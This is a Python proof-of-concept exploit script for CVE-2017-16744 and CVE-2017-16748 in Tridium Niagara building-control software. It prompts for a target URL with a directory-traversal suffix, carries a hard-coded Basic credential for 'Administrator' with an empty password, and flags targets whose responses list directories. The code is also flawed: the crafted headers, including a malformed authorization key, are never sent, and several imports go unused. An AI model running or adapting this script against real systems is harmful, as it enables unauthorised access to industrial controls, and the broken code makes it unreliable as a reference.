import urllib.request
import urllib.parse
import sqlite3
import os
import datetime
import re
import base64

'''
Proof of Concept (PoC) v3
Date: 09/09/2019
Exploit Author: GainSec 
Vendor Homepage: https://www.tridium.com/
Version: Affects Tridium Niagara AX Versions: 3.8 and prior as well as Niagara 4 Versions: 4.4 and prior
Discovered, Reported and PoC'd by Jonathan Gaines of Stratum Security; Formerly of Leet Cyber Security
CVE-2017-16744 and CVE-2017-16748
'''


current_time = datetime.datetime.now().time()
print('Current Time is: ')
print(current_time)


#Uncomment the two lines below ith # to proxy through burp

#proxy_host = 'localhost:8080'
print ("PoC for CVE-2017-16744 and CVE-2017-16748. Created by GainSec.com")
search = input('What is the target? http://example.com:3011/niagara/%5C%20   ' )

headers = { 'Host':'localhost', 'User-Agent':'Mozilla/5.0 (Windows LS 13.37; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                      'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate', 'DNT':'1', 'Connection':'keep-alive',
                          'Upgrade-Insecure-Requests':'1', 'Authorization Basic':'QWRtaW5pc3RyYXRvcjog'}

req = urllib.request.Request(search)
#req.set_proxy(proxy_host, 'http')
resp = urllib.request.urlopen(req)
respData = resp.read()

spantag = re.findall(r'directory name=', str(respData))

for finds in spantag:    
    print('Site may be vulnerable: ', finds, ' ', current_time)

